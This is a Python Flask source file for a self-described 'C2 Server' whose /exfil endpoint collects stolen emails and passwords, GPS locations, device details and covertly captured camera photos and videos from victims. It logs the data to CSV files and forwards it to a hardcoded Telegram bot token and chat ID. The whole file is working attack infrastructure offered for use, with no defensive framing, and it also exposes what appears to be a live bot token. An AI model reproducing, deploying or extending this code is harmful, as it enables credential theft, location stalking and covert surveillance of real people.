from flask import Flask, request, jsonify
import requests
import json
import base64
import os
import csv
from datetime import datetime

app = Flask(__name__)

# ============================================================
# CONFIG — CHANGE THESE
# ============================================================
TELEGRAM_TOKEN = "8440979863:AAE8OS_UzuvJV6T-sEqC9PuO0TvNUNapur8"
TELEGRAM_CHAT_ID = "8204622013"
# ============================================================

# Create folders for temporary storage
os.makedirs("photos", exist_ok=True)
os.makedirs("videos", exist_ok=True)
os.makedirs("logs", exist_ok=True)

# Credentials log
CREDENTIAL_CSV = os.path.join("logs", "credentials.csv")
if not os.path.exists(CREDENTIAL_CSV):
    with open(CREDENTIAL_CSV, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['timestamp', 'email', 'password', 'ip'])

# Location log
LOCATION_CSV = os.path.join("logs", "locations.csv")
if not os.path.exists(LOCATION_CSV):
    with open(LOCATION_CSV, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['timestamp', 'lat', 'lon', 'accuracy', 'source', 'city', 'country', 'ip'])

# ============================================================
# TELEGRAM HELPERS
# ============================================================
def send_telegram(message):
    """Send a text message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        if len(message) > 4000:
            for i in range(0, len(message), 4000):
                chunk = message[i:i+4000]
                requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": chunk, "parse_mode": "HTML"}, timeout=5)
        else:
            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=5)
        print("[✓] Forwarded to Telegram")
        return True
    except Exception as e:
        print(f"[!] Telegram error: {e}")
        return False

def send_file_to_telegram(file_path, caption=""):
    """Send a file to Telegram as a document"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption, 'parse_mode': 'HTML'}
            response = requests.post(url, files=files, data=data, timeout=30)
            if response.status_code == 200:
                print(f"[✓] File sent to Telegram: {file_path}")
            else:
                print(f"[!] Failed to send file: {response.text}")
        return True
    except Exception as e:
        print(f"[!] Error sending file: {e}")
        return False

# ============================================================
# CORS MIDDLEWARE
# ============================================================
@app.after_request
def add_cors(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Accept, X-Requested-With'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

# ============================================================
# MAIN ROUTE
# ============================================================
@app.route('/exfil', methods=['GET', 'POST', 'OPTIONS'])
def exfil():
    # Handle preflight
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        # Parse data
        if request.method == 'GET':
            data = request.args.to_dict()
        elif request.is_json:
            try:
                data = request.get_json(force=True, silent=True) or {}
            except:
                data = {}
        else:
            try:
                data = request.form.to_dict()
            except:
                data = {'raw': request.data.decode('utf-8', errors='ignore')}
        
        # Get IP
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
        data['ip'] = ip
        data['timestamp'] = datetime.now().isoformat()
        
        data_type = data.get('type', 'unknown')
        print(f"[+] Data: {data_type} from {ip}")
        
        # ============================================================
        # 1. CREDENTIALS
        # ============================================================
        if data_type == 'credentials':
            email = data.get('email', '')
            password = data.get('pass', '')
            user_agent = data.get('userAgent', '')
            
            with open(CREDENTIAL_CSV, 'a', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([data['timestamp'], email, password, ip])
            
            msg = f"🔐 <b>Credentials</b>\n"
            msg += f"📧 Email: <code>{email}</code>\n"
            msg += f"🔑 Password: <code>{password}</code>\n"
            msg += f"🌐 IP: {ip}\n"
            msg += f"🕐 Time: {data['timestamp']}"
            
            send_telegram(msg)
            print(f"[✓] Credentials: {email}")
            return jsonify({"status": "OK"}), 200
        
        # ============================================================
        # 2. LOCATION
        # ============================================================
        if data_type == 'location':
            lat = data.get('lat')
            lon = data.get('lon')
            accuracy = data.get('accuracy', '')
            source = data.get('source', 'gps')
            city = data.get('city', '')
            country = data.get('country', '')
            
            with open(LOCATION_CSV, 'a', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([data['timestamp'], lat, lon, accuracy, source, city, country, ip])
            
            msg = f"📍 <b>Location</b>\n"
            msg += f"🗺️ Lat: <code>{lat}</code>\n"
            msg += f"🗺️ Lon: <code>{lon}</code>\n"
            msg += f"📏 Accuracy: {accuracy}\n"
            msg += f"📡 Source: {source}"
            if city or country:
                msg += f"\n🏙️ {city}, {country}"
            msg += f"\n🔗 https://www.google.com/maps?q={lat},{lon}"
            
            send_telegram(msg)
            return jsonify({"status": "OK"}), 200
        
        # ============================================================
        # 3. BATTERY
        # ============================================================
        if data_type == 'battery':
            level = data.get('level', '')
            charging = data.get('charging', '')
            send_telegram(f"🔋 <b>Battery</b>\n⚡ Level: {level}\n🔌 Charging: {charging}")
            return jsonify({"status": "OK"}), 200
        
        # ============================================================
        # 4. NETWORK
        # ============================================================
        if data_type == 'network':
            net_type = data.get('type', '')
            downlink = data.get('downlink', '')
            send_telegram(f"📶 <b>Network</b>\n📡 Type: {net_type}\n📥 Downlink: {downlink} Mbps")
            return jsonify({"status": "OK"}), 200
        
        # ============================================================
        # 5. PHOTO
        # ============================================================
        if data_type == 'photo':
            raw = data.get('data', '')
            camera = data.get('camera', 'unknown')
            if raw:
                filename = f"photos/{camera}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(raw))
                send_file_to_telegram(filename, f"📸 <b>Photo</b> ({camera} camera)\nIP: {ip}")
                os.remove(filename)
                print(f"[✓] Photo forwarded to Telegram")
            return jsonify({"status": "OK"}), 200
        
        # ============================================================
        # 6. VIDEO
        # ============================================================
        if data_type == 'video':
            raw = data.get('data', '')
            camera = data.get('camera', 'front')
            duration = data.get('duration', '10s')
            if raw:
                filename = f"videos/{camera}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.webm"
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(raw))
                send_file_to_telegram(filename, f"🎥 <b>Video</b> ({camera} camera, {duration})\nIP: {ip}")
                os.remove(filename)
                print(f"[✓] Video forwarded to Telegram")
            return jsonify({"status": "OK"}), 200
        
        # ============================================================
        # 7. MEDIA ERROR
        # ============================================================
        if data_type == 'media_error':
            error = data.get('error', 'unknown')
            send_telegram(f"❌ Media error: {error}")
            return jsonify({"status": "OK"}), 200
        
        # ============================================================
        # 8. ACTION (install clicked, etc.)
        # ============================================================
        if data_type == 'action':
            action = data.get('action', 'unknown')
            send_telegram(f"⚡ <b>Action</b>\n🎯 {action}\n🌐 IP: {ip}")
            return jsonify({"status": "OK"}), 200
        
        # ============================================================
        # 9. TEST
        # ============================================================
        if data_type == 'test':
            msg = data.get('message', 'No message')
            send_telegram(f"🧪 Test message: {msg}")
            return jsonify({"status": "OK", "message": "Test received"}), 200
        
        # ============================================================
        # 10. DEFAULT
        # ============================================================
        send_telegram(f"📨 <b>Data</b>\n<pre>{json.dumps(data, indent=2)[:2000]}</pre>")
        return jsonify({"status": "OK"}), 200
        
    except Exception as e:
        error_msg = str(e)
        print(f"[!] Error: {error_msg}")
        send_telegram(f"[!] Server error: {error_msg}")
        return jsonify({"status": "ERROR", "message": error_msg}), 500

# ============================================================
# PING ROUTE
# ============================================================
@app.route('/ping', methods=['GET', 'OPTIONS'])
def ping():
    if request.method == 'OPTIONS':
        return '', 200
    return jsonify({"status": "PONG"}), 200

# ============================================================
# HOME ROUTE
# ============================================================
@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "C2 Server Running",
        "version": "4.0",
        "endpoints": ["/ping", "/exfil"],
        "features": [
            "credentials",
            "location",
            "battery",
            "network",
            "photo",
            "video"
        ]
    }), 200

# ============================================================
# MAIN ENTRY POINT
# ============================================================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    print("=" * 60)
    print("  🚀 C2 SERVER v4.0 - CLEAN SECURITY EDITION")
    print("=" * 60)
    print("  ✅ CORS enabled for all origins")
    print("  ✅ Telegram forwarding active")
    print("  ✅ Credentials logging active")
    print("  ✅ Location tracking active")
    print("  ✅ Photo forwarding active")
    print("  ✅ Video forwarding active")
    print(f"  ✅ Listening on: http://0.0.0.0:{port}")
    print("=" * 60)
    app.run(host="0.0.0.0", port=port, debug=False)
